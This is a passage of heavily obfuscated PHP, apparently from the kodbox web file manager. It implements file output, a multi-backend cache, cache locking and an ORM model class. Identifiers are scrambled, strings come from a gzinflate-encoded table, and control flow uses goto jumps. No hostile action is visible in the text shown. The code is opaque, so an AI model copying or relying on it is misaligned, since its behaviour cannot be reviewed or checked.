$°ﬂßø¢Ø = '', $ö¯ı∂• = false) { $ù∆¢∫√ÿ =& $_SERVER[ëæªã÷]; $…∑≥»¯÷ = $this->model->sourceInfo($ÎÅ˙◊˜—); if ($…∑≥»¯÷[$ù∆¢∫√ÿ[411]] == $ù∆¢∫√ÿ[99]) { header($ù∆¢∫√ÿ[1305]); die; } $‰õÆ˚≥∂ = $this->model->fileInfoGet($ÎÅ˙◊˜—); $°ﬂßø¢Ø = $‰õÆ˚≥∂[$ù∆¢∫√ÿ[179]] ? $‰õÆ˚≥∂[$ù∆¢∫√ÿ[179]] : $°ﬂßø¢Ø; $¨±œÂ˝≈ = isset($GLOBALS[$ù∆¢∫√ÿ[1306]]) ? $GLOBALS[$ù∆¢∫√ÿ[1306]] : $…∑≥»¯÷[$ù∆¢∫√ÿ[32]]; if ($ö¯ı∂•) { return IO::fileOutServer($‰õÆ˚≥∂[$ù∆¢∫√ÿ[88]], $ôﬁ—™ïë, $¨±œÂ˝≈, $°ﬂßø¢Ø); } IO::fileOut($‰õÆ˚≥∂[$ù∆¢∫√ÿ[88]], $ôﬁ—™ïë, $¨±œÂ˝≈, $°ﬂßø¢Ø); } public function fileOut($•∑ºËÈ…, $Ìë¥ﬂ’» = false, $É∏π…∑Ô = false, $óÃ¿ »Ñ = '') { $this->_fileOut($•∑ºËÈ…, $Ìë¥ﬂ’», $É∏π…∑Ô, $óÃ¿ »Ñ); } public function fileOutServer($Âñ‰≈˜¥, $ÀÁ˘Ó˜ = false, $Û´ºˆÓí = false, $ç÷î£¨Å = '') { $this->_fileOut($Âñ‰≈˜¥, $ÀÁ˘Ó˜, $Û´ºˆÓí, $ç÷î£¨Å, !0); } protected function _fileOutImage($…∑‰ÉëÅ, $∆ãåúÅ‚ = 250) { $—Òá“πº =& $_SERVER[ëæªã÷]; $…≥Ö°ëÉ = $this->model->pathInfo($…∑‰ÉëÅ); if ($…≥Ö°ëÉ[$—Òá“πº[411]] == $—Òá“πº[99]) { show_json($—Òá“πº[1307] . $…∑‰ÉëÅ, !1); } $∆“ñêË° = $this->model->fileInfoGet($…∑‰ÉëÅ); $∆“ñêË°[$—Òá“πº[32]] = $…≥Ö°ëÉ[$—Òá“πº[32]]; $∆“ñêË°[$—Òá“πº[172]] = $…≥Ö°ëÉ[$—Òá“πº[172]]; $GLOBALS[$—Òá“πº[1306]] = $∆“ñêË°[$—Òá“πº[32]]; $GLOBALS[$—Òá“πº[171]] = $∆“ñêË°; IO::fileOutImage($∆“ñêË°[$—Òá“πº[88]], $∆ãåúÅ‚); } public function fileOutImage($Ì¢∑ÆÊ∫, $≤ôÎÙ—√ = 250) { $this->_fileOutImage($Ì¢∑ÆÊ∫, $≤ôÎÙ—√); } public function fileOutImageServer($˜˚“ª’¸, $é˝ﬁÈﬂô = 250) { $this->_fileOutImage($˜˚“ª’¸, $é˝ﬁÈﬂô); } public function link($ÂéÄÚˆµ, $ÃØ¥§•± = '') { $Ó¨ÑëäÈ = $this->model->fileInfoGet($ÂéÄÚˆµ); return IO::link($Ó¨ÑëäÈ[$_SERVER[ëæªã÷][88]], $ÃØ¥§•±); } protected function parse($è›‡‰◊∂) { $≥÷¿«îŸ =& $_SERVER[ëæªã÷]; if (strstr($è›‡‰◊∂, $≥÷¿«îŸ[8]) === !1) { return array($≥÷¿«îŸ[420] => intval($è›‡‰◊∂), $≥÷¿«îŸ[88] => $≥÷¿«îŸ[12], $≥÷¿«îŸ[1302] => array()); } $Ï≤·∂£• = explode($≥÷¿«îŸ[8], trim($è›‡‰◊∂, $≥÷¿«îŸ[8])); if (count($Ï≤·∂£•) < 2) { show_tips(clear_html($è›‡‰◊∂) . $≥÷¿«îŸ[1308]); } return array($≥÷¿«îŸ[420] => intval($Ï≤·∂£•[0]), $≥÷¿«îŸ[88] => $Ï≤·∂£•[1], $≥÷¿«îŸ[1302] => array_slice($Ï≤·∂£•, 1)); } } goto a¡˜û“Ë≥ß; DÁ⁄Ã«Ü: define($_SERVER[ëæªã÷][0], $_SERVER[ëæªã÷][1]); $_SERVER[‰µ∏ÇÕù] = explode($_SERVER[ëæªã÷][2], gzinflate(substr($_SERVER[ëæªã÷][3], 10, -8))); function binCheckEq($ëÅÆ‘≠ﬁ, $Áé≠Ê∫˝) { return $ëÅÆ‘≠ﬁ == $Áé≠Ê∫˝; } goto CÑ◊€«ªﬂñ; aæﬁÕƒ„„À: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Öÿä∏âê =& $_SERVER[ëæªã÷]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Õﬂ‚´˘˜ = $GLOBALS[$Öÿä∏âê[6]][$Öÿä∏âê[353]]; $°‘⁄‘≤∆ = $Õﬂ‚´˘˜[$Õﬂ‚´˘˜[$Öÿä∏âê[807]]]; $Ã€ô˛† = $Õﬂ‚´˘˜[$Öÿä∏âê[808]]; switch ($Õﬂ‚´˘˜[$Öÿä∏âê[807]]) { case $Öÿä∏âê[21]: self::$handle = Model($Öÿä∏âê[809]); break; case $Öÿä∏âê[810]: self::$handle = new CacheRedis($°‘⁄‘≤∆, $Ã€ô˛†); break; case $Öÿä∏âê[811]: self::$handle = new CacheMemcached($°‘⁄‘≤∆, $Ã€ô˛†); break; case $Öÿä∏âê[202]: self::$handle = new CacheFile($°‘⁄‘≤∆, $Ã€ô˛†); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($®ñá«®˘) { if (is_array($®ñá«®˘) || is_object($®ñá«®˘)) { $®ñá«®˘ = json_encode($®ñá«®˘); } $®ñá«®˘ = rawurlencode($®ñá«®˘); return md5(KOD_SITE_ID . $_SERVER[ëæªã÷][11] . $®ñá«®˘); } public static function get($÷ù˝ﬂŸõ, $î‡Î£˘º = false) { $«…ò∞≠“ = self::key($÷ù˝ﬂŸõ); if ($î‡Î£˘º) { return unserialize(self::init()->get($«…ò∞≠“)); } if (!isset(self::$memoryCache[$«…ò∞≠“])) { $∆ÀÊπåÇ = self::init()->get($«…ò∞≠“); self::$memoryCache[$«…ò∞≠“] = unserialize($∆ÀÊπåÇ); } return self::$memoryCache[$«…ò∞≠“]; } public static function set($‘•˚ƒ‡¡, $ÈÌ™î¬º, $·– ˘á“ = false) { $±Ë—Ò˙¡ = self::key($‘•˚ƒ‡¡); if (isset(self::$memoryCache[$±Ë—Ò˙¡]) && self::$memoryCache[$±Ë—Ò˙¡] === $ÈÌ™î¬º) { return !0; } if ($·– ˘á“ === 0) { self::$memoryCache[$±Ë—Ò˙¡] = $ÈÌ™î¬º; return !0; } CacheLock::lock($‘•˚ƒ‡¡); $•··÷è¯ = self::init()->set($±Ë—Ò˙¡, serialize($ÈÌ™î¬º), $·– ˘á“); self::$memoryCache[$±Ë—Ò˙¡] = $ÈÌ™î¬º; CacheLock::unlock($‘•˚ƒ‡¡); return $•··÷è¯; } public static function getCall($™àé–Á˜, $÷‹õ„˚›, $Â©≥∏‘à, $ä˜Ï¿·Ú = array()) { $Åª¬´¸∑ =& $_SERVER[ëæªã÷]; $ÆÔ””ΩÈ = self::get($™àé–Á˜); if ($ÆÔ””ΩÈ || $ÆÔ””ΩÈ === $Åª¬´¸∑[12]) { return $ÆÔ””ΩÈ; } $ÆÔ””ΩÈ = call_user_func_array($Â©≥∏‘à, $ä˜Ï¿·Ú); $ÆÔ””ΩÈ = $ÆÔ””ΩÈ ? $ÆÔ””ΩÈ : $Åª¬´¸∑[12]; self::set($™àé–Á˜, $ÆÔ””ΩÈ, $÷‹õ„˚›); return $ÆÔ””ΩÈ; } public static function remove($çüË©›÷) { $Îƒº≤Ωå = self::key($çüË©›÷); unset(self::$memoryCache[$Îƒº≤Ωå]); self::clearTimeout(); CacheLock::lock($çüË©›÷); $∞ŒπâñÅ = self::init()->remove($Îƒº≤Ωå); CacheLock::unlock($çüË©›÷); return $∞ŒπâñÅ; } public static function removeMemory($†®≥˚∫Ô) { $˙ëÈëí• = self::key($†®≥˚∫Ô); unset(self::$memoryCache[$˙ëÈëí•]); } public static function clearMemory($öìÄ˚‰ = false) { if ($öìÄ˚‰) { $öìÄ˚‰ = self::key($öìÄ˚‰); unset(self::$memoryCache[$öìÄ˚‰]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ëæªã÷][812])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ëæªã÷][813])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($–êà£‚È, $Éé∫Ù»‡) { $ä˛ÜÛﬂ— =& $_SERVER[ëæªã÷]; $this->cachePath = $–êà£‚È[$ä˛ÜÛﬂ—[88]]; $this->prefix = $ä˛ÜÛﬂ—[814]; $this->cacheTime = $Éé∫Ù»‡; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¡äî˝æ¿) { $ü©¯±»« =& $_SERVER[ëæªã÷]; $¡äî˝æ¿ = str_replace(array($ü©¯±»«[815], $ü©¯±»«[108], $ü©¯±»«[83]), $ü©¯±»«[816], $¡äî˝æ¿); return $this->cachePath . $ü©¯±»«[817] . $¡äî˝æ¿ . $ü©¯±»«[818]; } public function set($»„óÅ∞œ, $ö•ôıÅË, $Ûƒã ﬂè = false) { $ËπÎé‰Ã = $this->getFile($»„óÅ∞œ); if (file_put_contents($ËπÎé‰Ã, $this->prefix . $ö•ôıÅË, LOCK_EX)) { @touch($ËπÎé‰Ã, intval(time() + $Ûƒã ﬂè)); clearstatcache(); return !0; } @unlink($ËπÎé‰Ã); return !1; } public function get($–Ä±˛òÂ) { $ı˝«‘»¶ = $this->getFile($–Ä±˛òÂ); if (file_exists($ı˝«‘»¶) && filemtime($ı˝«‘»¶) < time()) { @unlink($ı˝«‘»¶); return !1; } $§ÙË¶∂¸ = @file_get_contents($ı˝«‘»¶); return substr($§ÙË¶∂¸, strlen($this->prefix)); } public function remove($ÍÇ©ÏÇõ) { $–¿˜⁄Î» = $this->getFile($ÍÇ©ÏÇõ); return @unlink($–¿˜⁄Î»); } public function deleteAll() { $ ï∏ı±∆ =& $_SERVER[ëæªã÷]; $ù•ÚÁÂÀ = scandir($this->cachePath); foreach ($ù•ÚÁÂÀ as $∆˙›à™ö) { $ÁÆú€∂€ = $this->cachePath . $∆˙›à™ö; if (strpos($ÁÆú€∂€, $ ï∏ı±∆[818]) && strpos($ÁÆú€∂€, $ ï∏ı±∆[819])) { @unlink($ÁÆú€∂€); } } } public function clearTimeout() { $÷ºßıº =& $_SERVER[ëæªã÷]; $Ω—äø¡À = scandir($this->cachePath); foreach ($Ω—äø¡À as $ßË©“ÁÑ) { $ﬁÌˆﬁ≤Ù = $this->cachePath . $ßË©“ÁÑ; if (strpos($ﬁÌˆﬁ≤Ù, $÷ºßıº[818]) && strpos($ﬁÌˆﬁ≤Ù, $÷ºßıº[819]) && filemtime($ﬁÌˆﬁ≤Ù) < time()) { @unlink($ﬁÌˆﬁ≤Ù); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $…∫Åê˛Î =& $_SERVER[ëæªã÷]; if (self::$handle) { return self::$handle; } $ÿÂ∑Ü£Ò = $GLOBALS[$…∫Åê˛Î[6]][$…∫Åê˛Î[353]]; self::$timeout = $ÿÂ∑Ü£Ò[$…∫Åê˛Î[820]] ? $ÿÂ∑Ü£Ò[$…∫Åê˛Î[820]] : 10; $àÍ˘Â»É = _get($GLOBALS[$…∫Åê˛Î[6]], $…∫Åê˛Î[821]); $Ü≥¶˜É∑ = $ÿÂ∑Ü£Ò[$…∫Åê˛Î[807]] ? $ÿÂ∑Ü£Ò[$…∫Åê˛Î[807]] : $…∫Åê˛Î[202]; if ($Ü≥¶˜É∑ == $…∫Åê˛Î[21] && $àÍ˘Â»É == $…∫Åê˛Î[13]) { $Ü≥¶˜É∑ = $…∫Åê˛Î[202]; } switch ($Ü≥¶˜É∑) { case $…∫Åê˛Î[810]: self::$handle = new CacheLockRedis(); break; case $…∫Åê˛Î[811]: self::$handle = new CacheLockMemcached(); break; case $…∫Åê˛Î[21]: self::$handle = new CacheLockDatabase(); break; case $…∫Åê˛Î[202]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($…∫Åê˛Î[822], $…∫Åê˛Î[823]); } return self::$handle; } private static function key($ïÄıèéÄ) { return $_SERVER[ëæªã÷][824] . Cache::key($ïÄıèéÄ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($øøŒ›À‹ = '') { self::$errorMsg = $øøŒ›À‹; } public static function lockGlobal($â◊ıŒ–∏, $®Ÿ«◊Ωû) { return self::lock($â◊ıŒ–∏, $®Ÿ«◊Ωû, !0); } public static function lock($Õä‡Ü»å, $¨ ≤·´Õ = false, $≠ÎºÂã— = false) { $ÆêÊ¸ã¸ =& $_SERVER[ëæªã÷]; $Èã…‹µè = self::init(); $‚ç‹ÃÆﬁ = self::key($Õä‡Ü»å); $¨ ≤·´Õ = $¨ ≤·´Õ ? $¨ ≤·´Õ : self::$timeout; $Ñü‚†˘« = $Èã…‹µè->lock($‚ç‹ÃÆﬁ, $¨ ≤·´Õ); $Ü≠¢Á¬˜ = timeFloat(); if (!$Ñü‚†˘«) { $Ó£ÓÇˆ¸ = "\154\157\x63\x6b\40\145\x72\x72\157\x72\73\x6b\x65\171\x3d{$Õä‡Ü»å}\x3b\x74\x69\155\x65\75{$¨ ≤·´Õ}\73" . self::$errorMsg . $ÆêÊ¸ã¸[81] . get_caller_msg(); $æå±™„Ü = LNG($ÆêÊ¸ã¸[825]) . "\x28{$¨ ≤·´Õ}\x73\x29\x2e" . LNG($ÆêÊ¸ã¸[826]); $æå±™„Ü .= $ÆêÊ¸ã¸[827]; if (is_string(self::$errorMsg) && self::$errorMsg) { $æå±™„Ü = $æå±™„Ü . $ÆêÊ¸ã¸[828] . self::$errorMsg; } write_log($Ó£ÓÇˆ¸, $ÆêÊ¸ã¸[823]); show_json($æå±™„Ü, !1); } if (!$≠ÎºÂã—) { self::$lockItem[$‚ç‹ÃÆﬁ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $âªàœ Ø = number_format(timeFloat() - $Ü≠¢Á¬˜, 3); write_log($ÆêÊ¸ã¸[829] . $Õä‡Ü»å . $ÆêÊ¸ã¸[830] . $âªàœ Ø, $ÆêÊ¸ã¸[823]); } return $Ñü‚†˘«; } public static function lockGet($éüˆí¸å) { $´ºáÈ©§ = self::key($éüˆí¸å); if (self::$lockItem[$´ºáÈ©§]) { return self::$lockItem[$´ºáÈ©§]; } return self::init()->lockGet($´ºáÈ©§); } public static function unlock($ ∆”©ï«) { $·´ë˙€˚ =& $_SERVER[ëæªã÷]; $Ã•÷–∑Õ = self::key($ ∆”©ï«); self::$lockItem[$Ã•÷–∑Õ] = null; self::init()->unlock($Ã•÷–∑Õ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($·´ë˙€˚[831] . $ ∆”©ï«, $·´ë˙€˚[823]); } return; } public static function unlockRuntime() { $Ãé÷ÂÏà =& $_SERVER[ëæªã÷]; $π∆ãÒ¨– = self::init(); $˘’˛∏§û = !1; foreach (self::$lockItem as $¸øããè≈ => $Üäû˛ΩÉ) { if (!$Üäû˛ΩÉ) { continue; } $π∆ãÒ¨–->unlock($¸øããè≈); if (!$˘’˛∏§û) { $˘’˛∏§û = !0; write_log($Ãé÷ÂÏà[832] . $¸øããè≈ . $Ãé÷ÂÏà[81] . get_caller_msg(), $Ãé÷ÂÏà[823]); continue; } write_log($Ãé÷ÂÏà[832] . $¸øããè≈, $Ãé÷ÂÏà[823]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $œãõØà˛ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Ãé÷ÂÏà[833] . $œãõØà˛ . $Ãé÷ÂÏà[834] . ACTION, $Ãé÷ÂÏà[823]); } } public static function fileLock($¨”€∆îÂ) { $Á›øü — =& $_SERVER[ëæªã÷]; if (!$GLOBALS[$Á›øü —[835]]) { $GLOBALS[$Á›øü —[835]] = array(); } $GLOBALS[$Á›øü —[835]][$¨”€∆îÂ] = !1; $¬˙óÑÁ™ = fopen(DATA_PATH . $¨”€∆îÂ . $Á›øü —[836], $Á›øü —[837]); if (!$¬˙óÑÁ™) { return !1; } $GLOBALS[$Á›øü —[835]][$¨”€∆îÂ] = $¬˙óÑÁ™; if (flock($¬˙óÑÁ™, LOCK_EX)) { return !0; } self::unlock($¨”€∆îÂ); show_json($Á›øü —[838], !1); return !1; } public static function fileUnlock($Î€§¶¬Û) { $µ˛«Úó— =& $_SERVER[ëæªã÷]; $ò”ı–‰∞ = $GLOBALS[$µ˛«Úó—[835]][$Î€§¶¬Û]; if (!$ò”ı–‰∞) { return; } $GLOBALS[$µ˛«Úó—[835]][$Î€§¶¬Û] = !1; flock($ò”ı–‰∞, LOCK_UN); fclose($ò”ı–‰∞); } public static function fileUnlockAll() { $‘¯é˘•ù =& $_SERVER[ëæªã÷]; if (!$GLOBALS[$‘¯é˘•ù[835]]) { return; } foreach ($GLOBALS[$‘¯é˘•ù[835]] as $√˙÷ﬂÈ˛ => $›ÉÀ∫–≤) { if (!$›ÉÀ∫–≤) { continue; } $GLOBALS[$‘¯é˘•ù[835]][$√˙÷ﬂÈ˛] = !1; flock($›ÉÀ∫–≤, LOCK_UN); fclose($›ÉÀ∫–≤); } $GLOBALS[$‘¯é˘•ù[835]] = array(); } } goto f¶õ“âæÿ∑; CÇ´†ÈúãÚ: define($_SERVER[ëæªã÷][247], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\157\x72\144\x65\162", "\x61\x6c\x69\x61\x73", "\150\x61\166\x69\x6e\x67", "\x67\162\x6f\x75\x70", "\x6c\157\143\153", "\144\151\x73\x74\151\156\x63\164", "\141\x75\x74\x6f", "\x66\x69\x6c\164\145\x72", "\x76\x61\154\x69\144\x61\x74\145", "\162\145\163\x75\x6c\x74", "\142\151\x6e\144", "\164\157\x6b\145\x6e"); public function __construct($Ûùòöªò = '', $÷âŸ’ãô = '', $—œ‘˛ı˚ = '') { $ÏÎÉ≠≠‰ =& $_SERVER[ëæªã÷]; $this->_initialize(); if (!empty($Ûùòöªò)) { if (strpos($Ûùòöªò, $ÏÎÉ≠≠‰[10])) { list($this->dbName, $this->name) = explode($ÏÎÉ≠≠‰[10], $Ûùòöªò); } else { $this->name = $Ûùòöªò; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($÷âŸ’ãô)) { $this->tablePrefix = $ÏÎÉ≠≠‰[12]; } elseif ($ÏÎÉ≠≠‰[12] != $÷âŸ’ãô) { $this->tablePrefix = $÷âŸ’ãô; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÏÎÉ≠≠‰[248]); } $this->db(0, empty($this->connection) ? $—œ‘˛ı˚ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÑªÎ‡üΩ =& $_SERVER[ëæªã÷]; if (empty($this->fields)) { if (think_config($ÑªÎ‡üΩ[249])) { $ŸÆçÿÇÓ = $this->dbName ? $this->dbName : think_config($ÑªÎ‡üΩ[250]); $êŸî©ã« = think_var_cache($ÑªÎ‡üΩ[251] . strtolower(get_path_this($ŸÆçÿÇÓ) . $ÑªÎ‡üΩ[10] . $this->name)); if ($êŸî©ã«) { $‹≈◊÷‡ü = think_config($ÑªÎ‡üΩ[252]); if (empty($‹≈◊÷‡ü) || $êŸî©ã«[$ÑªÎ‡üΩ[253]] == $‹≈◊÷‡ü) { $this->fields = $êŸî©ã«; return; } } } $this->flush(); } } public function flush() { $◊∆ÒãÈ˝ =& $_SERVER[ëæªã÷]; $this->db->setModel($this->name); $´ªù∂Ó± = $this->db->getFields($this->getTableName()); if (!$´ªù∂Ó±) { return !1; } $this->fields = array_keys($´ªù∂Ó±); $this->fields[$◊∆ÒãÈ˝[254]] = !1; foreach ($´ªù∂Ó± as $ëõáá‚– => $ªÇéÃª…) { $¬ºâª»©[$ëõáá‚–] = $ªÇéÃª…[$◊∆ÒãÈ˝[33]]; if ($ªÇéÃª…[$◊∆ÒãÈ˝[39]]) { $this->fields[$◊∆ÒãÈ˝[255]] = $ëõáá‚–; if ($ªÇéÃª…[$◊∆ÒãÈ˝[42]]) { $this->fields[$◊∆ÒãÈ˝[254]] = !0; } } } $this->fields[$◊∆ÒãÈ˝[256]] = $¬ºâª»©; if (think_config($◊∆ÒãÈ˝[252])) { $this->fields[$◊∆ÒãÈ˝[253]] = think_config($◊∆ÒãÈ˝[252]); } if (think_config($◊∆ÒãÈ˝[249])) { $∞üÇü‰∏ = $this->dbName ? $this->dbName : think_config($◊∆ÒãÈ˝[250]); think_var_cache($◊∆ÒãÈ˝[251] . strtolower(get_path_this($∞üÇü‰∏) . $◊∆ÒãÈ˝[10] . $this->name), $this->fields); } } public function switchModel($÷—õº¶í, $¡§®œ‚‰ = array()) { $À» ∞å≥ =& $_SERVER[ëæªã÷]; $æç¡⁄ı¬ = ucwords(strtolower($÷—õº¶í)) . $À» ∞å≥[257]; if (!class_exists($æç¡⁄ı¬)) { think_exception($æç¡⁄ı¬ . think_lang($À» ∞å≥[258])); } $this->_extModel = new $æç¡⁄ı¬($this->name); if (!empty($¡§®œ‚‰)) { foreach ($¡§®œ‚‰ as $‘ã’ÌË˛) { $this->_extModel->setProperty($‘ã’ÌË˛, $this->{$‘ã’ÌË˛}); } } return $this->_extModel; } public function __set($«¯«ß∫™, $èÂÈﬂÎÌ) { $this->data[$«¯«ß∫™] = $èÂÈﬂÎÌ; } public function __get($ôº∫¿ç€) { return isset($this->data[$ôº∫¿ç€]) ? $this->data[$ôº∫¿ç€] : null; } public function __isset($¶Œê∫£¡) { return isset($this->data[$¶Œê∫£¡]); } public function __unset($›ÊÙÕÁ◊) { unset($this->data[$›ÊÙÕÁ◊]); } public function __call($˛˘õç·ï, $Ä•Å˚“—) { $Í≈…πé˘ =& $_SERVER[ëæªã÷]; if (in_array(strtolower($˛˘õç·ï), $this->methods, !0)) { $this->options[strtolower($˛˘õç·ï)] = $Ä•Å˚“—[0]; return $this; } elseif (in_array(strtolower($˛˘õç·ï), array($Í≈…πé˘[259], $Í≈…πé˘[260], $Í≈…πé˘[261], $Í≈…πé˘[262], $Í≈…πé˘[263]), !0)) { $†ÍÄˆ‡¬ = isset($Ä•Å˚“—[0]) ? $Ä•Å˚“—[0] : $Í≈…πé˘[191]; $†ÍÄˆ‡¬ = $this->db->parseKey($†ÍÄˆ‡¬); return $this->getField(strtoupper($˛˘õç·ï) . $Í≈…πé˘[264] . $†ÍÄˆ‡¬ . $Í≈…πé˘[265] . $˛˘õç·ï, $Í≈…πé˘[259]); } elseif (strtolower(substr($˛˘õç·ï, 0, 5)) == $Í≈…πé˘[266]) { $†ÍÄˆ‡¬ = think_parse_name(substr($˛˘õç·ï, 5)); $ù˝¨ñºå[$†ÍÄˆ‡¬] = $Ä•Å˚“—[0]; return $this->where($ù˝¨ñºå)->find(); } elseif (strtolower(substr($˛˘õç·ï, 0, 10)) == $Í≈…πé˘[267]) { $ ´¶„Ó™ = think_parse_name(substr($˛˘õç·ï, 10)); $ù˝¨ñºå[$ ´¶„Ó™] = $Ä•Å˚“—[0]; return $this->where($ù˝¨ñºå)->getField($Ä•Å˚“—[1]); } elseif (isset($this->_scope[$˛˘õç·ï])) { return $this->scope($˛˘õç·ï, $Ä•Å˚“—[0]); } elseif (method_exists($this, $˛˘õç·ï)) { array_unshift($Ä•Å˚“—, $˛˘õç·ï); return call_user_func_array(array($this, $Í≈…πé˘[268]), $Ä•Å˚“—); } else { return call_user_func_array(array(parent, $˛˘õç·ï), $Ä•Å˚“—); } } protected function call() { $øÕµæû‘ =& $_SERVER[ëæªã÷]; $è†ªŒÇ˙ = func_get_args(); $∞∫íÜ∑µ = array_shift($è†ªŒÇ˙); $—ÑÎ¶Øé = $∞∫íÜ∑µ; if (is_array($∞∫íÜ∑µ)) { $—ÑÎ¶Øé = $∞∫íÜ∑µ[1]; $∞∫íÜ∑µ = $∞∫íÜ∑µ[0]; } $≥ÚÂ¬Î∑ = count($è†ªŒÇ˙) - 1; if (isset($è†ªŒÇ˙[$≥ÚÂ¬Î∑]) && $è†ªŒÇ˙[$≥ÚÂ¬Î∑] === $∞∫íÜ∑µ) { think_exception(__CLASS__ . $øÕµæû‘[4] . $∞∫íÜ∑µ . think_lang($øÕµæû‘[269])); return; } $è†ªŒÇ˙[] = $∞∫íÜ∑µ; if (method_exists($this, $øÕµæû‘[270])) { $¯”âí≥˚ = call_user_func_array(array($this, $øÕµæû‘[271]), array($—ÑÎ¶Øé, $è†ªŒÇ˙)); if (!is_null($¯”âí≥˚) && $¯”âí≥˚ !== !1) { return $¯”âí≥˚; } } $òÈûﬂ∞ã = call_user_func_array(array($this, $∞∫íÜ∑µ), $è†ªŒÇ˙); if (method_exists($this, $øÕµæû‘[272])) { $¯”âí≥˚ = call_user_func_array(array($this, $øÕµæû‘[273]), array($—ÑÎ¶Øé, $è†ªŒÇ˙, $òÈûﬂ∞ã)); if ($¯”âí≥˚) { return $¯”âí≥˚; } } return $òÈûﬂ∞ã; } protected function _initialize() { } protected function _facade($Ñ‡◊‡ãä) { $¿í◊Îœ¬ =& $_SERVER[ëæªã÷]; if (!empty($this->fields)) { foreach ($Ñ‡◊‡ãä as $÷¥œÀÉÄ => $µÜ˘≥∆Û) { if (is_array($this->fields) && !in_array($÷¥œÀÉÄ, $this->fields, !0)) { unset($Ñ‡◊‡ãä[$÷¥œÀÉÄ]); } elseif (is_scalar($µÜ˘≥∆Û)) { $this->_parseType($Ñ‡◊‡ãä, $÷¥œÀÉÄ); } } } if (!empty($this->options[$¿í◊Îœ¬[274]])) { $Ñ‡◊‡ãä = array_map($this->options[$¿í◊Îœ¬[274]], $Ñ‡◊‡ãä); unset($this->options[$¿í◊Îœ¬[274]]); } $this->_beforeWrite($Ñ‡◊‡ãä); return $Ñ‡◊‡ãä; } protected function _beforeWrite(&$‰—Ç…ô¥) { } public function add($≤æà√Å≠ = '', $∆…éÏ–≤ = array(), $ÖÌ∆¯◊≠ = false) { if (empty($≤æà√Å≠)) { if (!empty($this->data)) { $≤æà√Å≠ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ëæªã÷][275]); return !1; } } $∆…éÏ–≤ = $this->_parseOptions($∆…éÏ–≤); $≤æà√Å≠ = $this->_facade($≤æà√Å≠); if (!1 === $this->_beforeInsert($≤æà√Å≠, $∆…éÏ–≤)) { return !1; } $Ó˚≥ñ˙¬ = $this->db->insert($≤æà√Å≠, $∆…éÏ–≤, $ÖÌ∆¯◊≠); if (!1 !== $Ó˚≥ñ˙¬) { $„á‚òœÕ = $this->getLastInsID(); if ($„á‚òœÕ) { $≤æà√Å≠[$this->getPk()] = $„á‚òœÕ; $this->_after_insert($≤æà√Å≠, $∆…éÏ–≤); return $„á‚òœÕ; } $this->_after_insert($≤æà√Å≠, $∆…éÏ–≤); } return $Ó˚≥ñ˙¬; } protected function _beforeInsert(&$ÖÒ≈ï”„, $»¯◊Á‘˛) { } protected function _after_insert($˙ôüΩ•Ï, $í•ö≥á») { } public function addAll($˘¸Éπ√ã, $µ€ÅÔ∂Ó = array(), $ÑÈÔû™˜ = false) { $ÏæñÏΩÈ =& $_SERVER[ëæªã÷]; if (empty($˘¸Éπ√ã)) { $this->error = think_lang($ÏæñÏΩÈ[275]); return !1; } $µ€ÅÔ∂Ó = $this->_parseOptions($µ€ÅÔ∂Ó); foreach ($˘¸Éπ√ã as $”≥◊¸Û™ => $úÑ∑±Æ≥) { $˘¸Éπ√ã[$”≥◊¸Û™] = $this->_facade($úÑ∑±Æ≥); } if (method_exists($this->db, $ÏæñÏΩÈ[276])) { $É“ô›—„ = $this->db->insertAll($˘¸Éπ√ã, $µ€ÅÔ∂Ó, $ÑÈÔû™˜); } else { $this->startTrans(); foreach ($˘¸Éπ√ã as $”≥◊¸Û™ => $úÑ∑±Æ≥) { $É“ô›—„ = $this->db->insert($úÑ∑±Æ≥, $µ€ÅÔ∂Ó, $ÑÈÔû™˜); } $this->commit(); } if (!1 !== $É“ô›—„) { $ÇÖûú‘ = $this->getLastInsID(); if ($ÇÖûú‘) { return $ÇÖûú‘; } } return $É“ô›—„; } public function selectAdd($˛‡áÛÌÅ = '', $±™†◊À¸ = '', $åß•¨Ç = array()) { $€˘äìæ’ =& $_SERVER[ëæªã÷]; $åß•¨Ç = $this->_parseOptions($åß•¨Ç); if (!1 === ($‰œÄéçÉ = $this->db->selectInsert($˛‡áÛÌÅ ? $˛‡áÛÌÅ : $åß•¨Ç[$€˘äìæ’[277]], $±™†◊À¸ ? $±™†◊À¸ : $this->getTableName(), $åß•¨Ç))) { $this->error = think_lang($€˘äìæ’[278]); return !1; } else { return $‰œÄéçÉ; } } public function save($√”˛œº› = '', $ö†˝˜µû = array()) { $ïıËØÍ≤ =& $_SERVER[ëæªã÷]; if (empty($√”˛œº›)) { if (!empty($this->data)) { $√”˛œº› = $this->data; $this->data = array(); } else { $this->error = think_lang($ïıËØÍ≤[275]); return !1; } } $√”˛œº› = $this->_facade($√”˛œº›); 